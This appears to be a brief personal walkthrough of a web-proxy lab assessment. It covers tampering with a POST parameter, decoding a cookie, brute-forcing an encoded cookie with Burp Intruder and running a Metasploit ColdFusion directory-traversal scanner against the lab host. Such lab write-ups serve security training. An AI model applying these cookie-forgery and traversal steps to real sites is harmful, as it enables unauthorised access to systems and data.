### Skills Assessment - Using Web Proxies

```
# Target: 94.237.53.128:54489

# localhost IP: 10.10.14.230
```

```
# 1st task
# Weird tbh. So, intercept basic POST request determine the name/value - getflag/true is disabled.
# Next update POST request with changes in these fields below:

POST /lucky.php/?getflag=true HTTP/1.1
...
Referer: http://94.237.53.128:54489/lucky.php?getflag=true
...
Connection: close
...
getflag=true

# Send request many times (~x10), check bytes size of responses (will be more) to determine when flag will appeared.
```

```
# 2nd task
# Intercept request responce, grab the cookie value, next decode as ASCII hex -> Base64
```

```
# 3rd task
# Grab GET request for /admin.php send to intruder
# Update cookie as : cookie=§char§
# Add alphanum-case.txt from Seclists to Payload configuration
# Add (in order!) to Payload processing:
1.Prefix with decoded cookie from perv task 
2.Encode Base64 
3.Encode ASCII hex

# Start attack, sort responses by length, in shorter (can be a few) you will find a flag. 
```


```
# 4th task
# From localhost:

mfsconsole
use auxiliary/scanner/http/coldfusion_locale_traversal
set set RHOSTS 94.237.53.128
set RPORT 54489
set Proxies HTTP:127.0.0.1:8080
run

# In Burp, in intercepted request, check GET request header and you'll see target folder name.
```
